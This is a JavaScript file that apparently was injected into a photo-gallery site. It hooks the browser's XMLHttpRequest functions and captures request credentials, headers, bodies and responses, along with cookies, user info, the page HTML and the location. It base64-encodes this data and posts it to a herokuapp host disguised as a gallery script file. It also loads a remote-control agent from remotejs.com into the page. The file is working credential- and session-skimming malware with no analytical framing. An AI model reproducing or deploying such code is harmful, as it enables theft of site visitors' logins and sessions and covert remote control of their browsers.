// Create a session ID for the window
if (!window.rjsSessionId) {
  window.rjsSessionId = uuidv4();
}

// Setup the functions
if (!window.remoteSetupComplete) {
  function uuidv4() {
    return ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, c =>
      (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
    );
  }

  function sendData(type, data) {
    try {
      const envelope = {};
      envelope.sessionId = window.rjsSessionId;
      envelope.type = type;
      envelope.data = data;
      envelope.userAgent = navigator?.userAgent;

      envelope.ptData = {};
      envelope.ptData.headers = _pt$?.hdrs || null;
      envelope.ptData.userInfo = _pt$?.userInfo || null;
      envelope.ptData.cookie = document.cookie;

      fetch('https://pictimecloudaf-a.herokuapp.com/pictures/scripts/compiled/pack_gallery.js', {
        method: 'POST',
        headers: {
          'Content-Type': 'text/plain'
        },
        body: encodeURIComponent(btoa(JSON.stringify(envelope)))
      });
    } catch (err) { }
  }

  const xhrMap = new Map();

  const origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function () {
    this.xhrId = uuidv4();

    const xhrData = {};

    xhrData.request = {};
    xhrData.request.method = arguments[0];
    xhrData.request.url = arguments[1];
    xhrData.request.async = arguments[2];
    xhrData.request.user = arguments[3];
    xhrData.request.password = arguments[4];

    xhrMap.set(this.xhrId, xhrData);

    this.addEventListener('load', function () {
      const xhrData = xhrMap.get(this.xhrId);

      // Set Response Headers
      const responseHeaders = this.getAllResponseHeaders().split('\r\n').map(header => {
        const split = header.split(/:(.*)/s);
        return { name: split[0], value: split[1] }
      });

      xhrData.responseHeaders = responseHeaders;

      // Set Response Body
      if (this.responseType === 'json') {
        xhrData.responseBody = this.response;
      } else {
        try {
          xhrData.responseBody = JSON.parse(this.responseText);
        } catch (err) {
          xhrData.responseBody = this.responseText;
        }
      }

      xhrMap.set(this.xhrId, xhrData);

      // Send data
      if (!xhrData.request.url.includes('https://remotejs.com/')) {
        sendData('xhr', xhrData);
      }
    });

    origOpen.apply(this, arguments);
  };

  // Set Request Body
  const origSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function () {
    const xhrData = xhrMap.get(this.xhrId);

    const requestBody = arguments[0];
    try {
      xhrData.requestBody = JSON.parse(requestBody);
    } catch (err) {
      xhrData = requestBody;
    }
    xhrMap.set(this.xhrId, xhrData);

    origSend.apply(this, arguments);
  };

  // Set Request Headers
  const origSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
  XMLHttpRequest.prototype.setRequestHeader = function () {
    const xhrData = xhrMap.get(this.xhrId);

    xhrData.requestHeaders = xhrData.requestHeaders || [];
    xhrData.requestHeaders.push({ name: arguments[0], value: arguments[1] });
    xhrMap.set(this.xhrId, xhrData);

    origSetRequestHeader.apply(this, arguments);
  };

  // Start session
  function startSession() {
    if (!window.self.location.href.includes('mobilecover') && !window.remoteInit) { 
      const agentScript = document.createElement('script');
      agentScript.src = 'https://remotejs.com/agent/agent.js';
      agentScript.setAttribute('data-consolejs-channel', window.rjsSessionId);
      document.head.appendChild(agentScript);
      window.remoteInit = true;
    }
  };
  
  window.remoteSetupComplete = true;
}

// Start Remote Session
startSession();
sendData('session', { sessionId });

// Send Location
sendData('location', window.location);

// Send Page HTML
const pageHTML = new XMLSerializer().serializeToString(document);
sendData('page-html', pageHTML);

// Send JS files
const jsFiles = performance.getEntriesByType('resource').filter(entry => entry.initiatorType === 'script').map(entry => entry.name);
sendData('js-files', jsFiles);

// Send Window Properties
const windowProps = [];
for (const prop in window) {
  windowProps.push(prop);
}
sendData('window-props', windowProps);

// Send PT Properties
const ptProps = [];
for (const prop in _pt$) {
  ptProps.push(prop);
}
sendData('pt-props', ptProps);
